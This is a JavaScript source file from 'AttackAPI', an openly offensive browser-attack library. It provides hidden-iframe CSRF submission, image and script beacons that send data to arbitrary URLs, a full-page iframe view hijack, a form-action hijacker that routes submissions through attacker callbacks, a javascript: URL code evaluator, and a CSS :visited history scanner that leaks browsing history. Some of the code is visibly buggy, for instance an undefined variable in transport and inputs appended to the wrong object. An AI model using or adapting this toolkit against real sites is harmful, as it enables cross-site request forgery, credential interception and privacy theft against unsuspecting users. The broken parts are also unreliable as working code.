
/**
 * @name AttackAPI.Exploit['::DOM']
 * @desc DOM  based util class, father of all DOM utils
 * @extend AttackAPI.Util
 */
AttackAPI.Util['::DOM'] = AttackAPI.Util.extend({
	/**
	 * @name AttackAPI.Parser['::DOM'].prototype.initialize
	 * @desc create queryParser
	 */
	initialize: function () {
		this.queryParser = new AttackAPI.Parser['::Query'];
		arguments.callee.$.initialize.apply(this, arguments);
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.transport
	 * @desc tarsport data to the targeted resource
	 * @param Object t the transport object
	 */
	transport: function (t) {
		var u = r.url + '?' + this.queryParser.build(r.query);
		
		if (u.length <= 2048)
			return this.requestL(u);
		else
			return this.requestCSRF(this.unroll(r, {method: 'POST'}));
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.request
	 * @desc perform request using the Image object
	 * @param Object r the request object
	 */
	request: function (r) {
		var t = null;
		
		var i = new Image();
		i.onload = i.onerror = function () {
			window.clearTimeout(t);
			
			if (typeof(r.onload) == 'function')
				r.onload({}, r);
		};
		
		if (r.query)
			i.src = r.url + '?' + this.queryParser.build(r.query);
		else
			i.src = r.url;
			
		t = window.setTimeout(function () {
			delete i;
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:1000);
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestL
	 * @desc lite implementation of AttackAPI.Util.prototype.request
	 * @param String u the url to request
	 */
	requestL: function (u) {
		var i = new Image();
		i.src = u;
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestJS
	 * @desc perform request using the a script tag object
	 * @param Object r the request object
	 */
	requestJS: function (r) {
		var t = null;
		
		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.onload = function () {
			window.clearTimeout(t);
			
			if (typeof(r.onload) == 'function')
				r.onload({}, r);
		};
		s.onerror = function () {
			window.clearTimeout(t);
			
			if (typeof(t.onerror) == 'function')
				t.onerror('error', request);
		};
		
		if (r.query)
			s.src = r.url + '?' + this.queryParser.build(r.query);
		else
			s.src = r.url;
			
		document.body.appendChild(s);
		
		t = window.setTimeout(function () {
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:1000);
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestJSL
	 * @desc lite implementation of AttackAPI.Util.prototype.requestJS
	 * @param String url the url to request
	 */
	requestJSL: function (url) {
		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.src = url;
		
		document.body.appendChild(s);
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestXHR
	 * @desc perform request using the XMlHttpRequest object
	 * @param Object r the request object
	 */
	requestXHR: function (r) {
		try {
			var x = this.getXHR();
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
				return;
		}
		
		var t = window.setTimeout(function () {
			x.abort();
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:10000);
		
		x.onreadystatechange = function () {
			if (x.readyState == 4) {
				window.clearTimeout(t);
				
				if (typeof(r.onload) == 'function')
					r.onload({status: x.status, data: x.responseText, dataXML: x.responseXML, headers: x.getAllResponseHeaders()}, x);
			}
		};
		
		try {
			var m = r.method?r.method:'GET';
			var u = r.url + (m == 'GET' && r.query?'?' + this.queryParser.build(r.query):'');
			
			x.open(m, u);
			
			if (r.headers)
				for (var h in r.headers)
					x.setRequestHeader(h, r.headers[h]);
					
			x.send(r.body?r.body:(m != 'GET' && r.query?this.queryParser.build(r.query):null));
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
			return;
		}
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestCSRF
	 * @desc perform request using hiden IFRAME with anonymous form
	 * @param Object r the request object
	 */
	requestCSRF: function (r) {
		var t = null;
		
		var i = document.createElement('iframe');
		i.style.visibility = 'hidden';
		i.style.width = i.style.height = 0;
		
		document.body.appendChild(i);
		
		try {
			var d = this.getDoc(i);
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
			return;
		}
		
		var f = document.createElement('form');
		f.setAttribute('method', r.method?r.method:'GET');
		f.setAttribute('action', r.url);
		
		for (var n in r.query) {
			var _i = document.createElement('input');
			_i.setAttribute('name', n);
			_i.setAttribute('value', r.query[n]);
			_i.setAttribute('type', 'text');
			
			r.appendChild(_i);
		}
		
		d.body.appendChild(f);
	
		i.onload = function () {
			window.clearTimeout(t);
			
			var d = null;
			
			try {
				data = this.getDoc(i).body.innerHTML;
			} catch (e) {}
			
			i.src = '';
			document.body.removeChild(i);
			
			if (typeof(r.onload) == 'function')
				r.onload({data: d}, r);
		};
		
		t = window.setTimeout(function () {
			document.body.removeChild(i);
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:10000);
		
		f.submit();
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.requestJSON
	 * @desc perform request using JSON
	 * @param Object r the request object
	 */
	requestJSON: function (r) {
		var n = '__callback' + new Date().getTime();
		
		window[n] = function () {
			if (typeof(r.oncallback) == 'function')
				r.oncallback.apply(r, arguments);
		};
		
		var q = r.query?r.query:{};
		q[r.callback?r.callback:'callback'] = n;
		
		this.requestJSL(r.url + '?' + this.queryParser.build(q));
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.hijackView
	 * @desc get hijacks the specified view
	 * @param Object obj the hijacker definition
	 */
	hijackView: function (obj) {
		var doc = obj.document?obj.document:this.getDoc();
		
		var ifr = doc.createElement('iframe');
		ifr.onload = obj.onload;
		ifr.src = obj.url?obj.url:doc.location;
		
		doc.body.scroll = 'no';
		doc.body.appendChild(ifr);
		
		ifr.style.position = 'absolute';
		ifr.style.width = ifr.style.height = '100%';
		ifr.style.top = ifr.style.left = ifr.style.border = 0;
		ifr.style.background = '#FFFFFF';
		
		ifr.focus();
		
		return ifr;
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.hijackForm
	 * @desc get hijacks the specified form
	 * @param Object obj the hijacker definition
	 */
	hijackForm: function (hijack) {
		if (!hijack.form.id)
			hijack.form.id = ('form_' + Math.random() + '_' + new Date().getTime()).replace('.', '_');
			
		hijack.form.__hijackForm = function (url) {
			this.action = url;
			
			if (typeof(hijack.onsubmit) == 'function') 
				hijack.onsubmit.apply(this, []);
				
			this.submit();
		};
		
		hijack.form.action = "javascript:document.getElementById('" + hijack.form.id + "').__hijackForm('" + hijack.form.action + "')";
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.getXHR
	 * @desc get XMlHttpRequest instance in a cross browser manner
	 */
	getXHR: function () {
		if (window.XMLHttpRequest) return new XMLHttpRequest();
		else if (window.createRequest) return window.createRequest();
		else if (window.ActiveXObject) {
			try { return new ActiveXObject('Msxml2.XMLHTTP');
			} catch (e) {
				try { return new ActiveXObject('Microsoft.XMLHTTP');
				} catch (e) {}
			}
		}
		
		throw 'XMLHttpRequest implementation not found'
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.getDoc
	 * @desc get the document object in a cross browser manner
	 * @param Object target the target from where the document object will be extracted
	 */
	getDoc: function (target) {
		if (target == undefined) return document;
		else if (target.contentDocument) return target.contentDocument;
		else if (target.contentWindow) return target.contentWindow.document;
		else if (target.document) return target.document;

		throw 'document object not found';
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.getSandbox
	 * @desc get a sandbox
	 * @param Object data the data to pass to the sandbox
	 */
	getSandbox: function (data) {
		var queue = [];
		var loaded = false;
		
		var ifr = document.createElement('iframe');
		ifr.style.visibility = 'hidden';
		ifr.style.width = ifr.style.height = 0;
		
		document.body.appendChild(ifr);
		
		var doc = this.getDoc(ifr);
		
		var sandbox = {
			scope: doc,
			
			evaluate: function (expr) {
				if (!loaded)
					queue.push(expr)
	
				else
					this.scope.location = 'javascript:' + escape(expr) + ';void(0);';
			},
			terminate: function () {
				document.body.removeChild(ifr);
			}
		};
		
		ifr.onload = function () {
			loaded = true;
			
			this.extend(doc, data);
			
			for (var i = 0; i < queue.length; i++)
				sandbox.evaluate(queue[i]);
		};
		
		return sandbox;
	},
	/**
	 * @name AttackAPI.Util['::DOM'].prototype.log
	 * @desc log a message into Firebug console
	 */
	log: function () {
		if (window.console.log)
			window.console.log.apply(window.console.log, arguments);
	}
});

/**
 * @name AttackAPI.Exploit['::DOM']
 * @desc DOM  based exploit class, father of all DOM exploits
 * @extend AttackAPI.Exploit
 */
AttackAPI.Exploit['::DOM'] = AttackAPI.Exploit.extend({
	/**
	 * @name AttackAPI.Exploit['::DOM'].prototype.initialize
	 * @desc create domUtil
	 */
	initialize: function () {
		this.domUtil = new AttackAPI.Util['::DOM'];
		arguments.callee.$.initialize.apply(this, arguments);
	}
});

/**
 * @name AttackAPI.Util['::DOM::Sandbox']
 * @desc create a sendbox
 * @extend AttackAPI.Util
 */
AttackAPI.Util['::DOM::Sandbox'] = AttackAPI.Util.extend({
	/**
	 * @name AttackAPI.Util['::DOM::Sandbox'].prototype.initialize
	 * @desc initialize a new sandbox
	 */
	initialize: function () {
		this.queue = [];
		this.loaded = false;
		
		this.ifr = window.document.createElement('iframe');
		this.ifr.style.visibility = 'hidden';
		this.ifr.style.width = this.ifr.style.height = 0;
		
		window.document.body.appendChild(this.ifr);
		
		var self = this;
		
		this.ifr.onload = function () {
			self.loaded = true;
			
			while (self.queue)
				self.evaluate(self.queue.pop());
		};
		
		arguments.callee.$.initialize.apply(this, arguments);
	},
	/**
	 * @name AttackAPI.Util['::DOM::Sandbox'].prototype.evaluate
	 * @desc evaluate expression in the sandbox
	 * @param String s the expression to be evaluated
	 */
	evaluate: function (s) {
		if (!this.loaded) {
			this.queue.push(s);
		} else {
			this.ifr.contentWindow.location = 'javascript:' + escape(s) + ';void(0);';
		}
	},
	/**
	 * @name AttackAPI.Util['::DOM::Sandbox'].prototype.terminate
	 * @desc terminate the sandbox
	 */
	terminate: function () {
		document.body.removeChild(this.ifr);
	}
});

/**
 * @name AttackAPI.Util['::DOM::Google AJAX Search']
 * @desc perform search via Google AJAX Search API
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::Google AJAX Search'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Google AJAX Search'].prototype.search
	 * @desc perform the search
	 * @param Object r the request object to be used
	 */
	search: function (r) {
		return this.requestJSON({
			url: 'http://www.google.com/uds/GwebSearch',
			query: {
				context: (r.context != undefined)?r.context:0,
				key: (r.key != undefined)?r.key:'internal-documentation',
				lstkp: 0,
				rsz: 'large',
				hl: 'en',
				v: '0.1',
				q: r.query
			},
			oncallback: r.callback
		});
	}
});

/**
 * @name AttackAPI.Util['::DOM::CSS History Scanner']
 * @desc perform search via Google AJAX Search API
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::CSS History Scanner'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Google AJAX Search'].prototype.scan
	 * @desc perform the scan
	 * @param Object r the request object to be used
	 */
	scan: function (r) {
		var ifr = document.createElement('iframe');
		ifr.style.visibility = 'hidden';
		ifr.style.width = ifr.style.height = 0;
		
		document.body.appendChild(ifr);
		
		var doc = this.getDoc(ifr);
		doc.open();
		doc.write('<style>a:visited{display: none}</style>');
		doc.close();
		
		for (var i = 0; i < r.urls.length; i++) {
			var a = doc.createElement('a');
			a.href = r.urls[i];
			
			doc.body.appendChild(a);
			
			if (a.currentStyle)
				var display = a.currentStyle['display'];
			else
				var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display')
				
			if (display == 'none' && typeof(r.onfound) == 'function')
				r.onfound(r.urls[i], r);
		}
		
		document.body.removeChild(ifr);
		
		if (typeof(r.oncomplete) == 'function')
			r.oncomplete(r);
	}
});

/**
 * @name AttackAPI.Util['::DOM::State Scanner']
 * @desc detect state of a resource
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::State Scanner'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::State Scanner'].prototype.scan
	 * @desc perform the scan
	 * @param Object r the request object to be used
	 */
	scan: function (r) {
	}
});